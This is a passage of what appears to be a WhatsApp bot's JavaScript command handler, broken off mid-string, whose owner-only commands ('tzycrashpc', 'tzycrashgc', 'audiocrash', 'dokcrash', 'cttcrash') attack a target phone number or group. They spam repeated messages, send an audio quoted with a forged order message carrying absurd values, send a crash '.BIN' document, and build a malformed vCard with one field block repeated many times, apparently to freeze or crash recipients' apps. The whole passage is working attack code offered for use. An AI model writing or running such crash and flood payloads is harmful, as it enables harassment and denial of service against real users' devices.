zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
}
break
case "tzycrashpc" : {
if (!isCreator) return onlyOwner()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
}
break
case "tzycrashgc" : {
if (!isCreator) return onlyOwner()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: a})
await sleep(1000)
zyren.sendMessage(Pe, {text: `${notif3}`}, {quoted: a})
await sleep(1000)
}
break
//=================================================//
/*BUG WACAP */
case "audiocrash": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync("./media/gambarnye/thezyren.jpg"),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"orderTitle": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
            } 
        } 
     }
zyren.sendMessage(num, { audio: fs.readFileSync("./basetzy/virtex/🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛.mp3"), mimetype: "audio/mpeg", }, {quoted: adehvn})
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "dokcrash":{
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync("./basetzy/virtex/ngeselin.BIN")
zyren.sendMessage(num, { document: anuin, mimetype: "application/octet-stream", fileName: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${place}.BIN`, title: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘.BIN` }, { quoted: pak })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
case "cttall": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}                          		
          zyren.sendContact(m.chat, ownerNumber, `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`, fkontaak)
         }
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
            break
//=================================================//
case "cttcrash": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 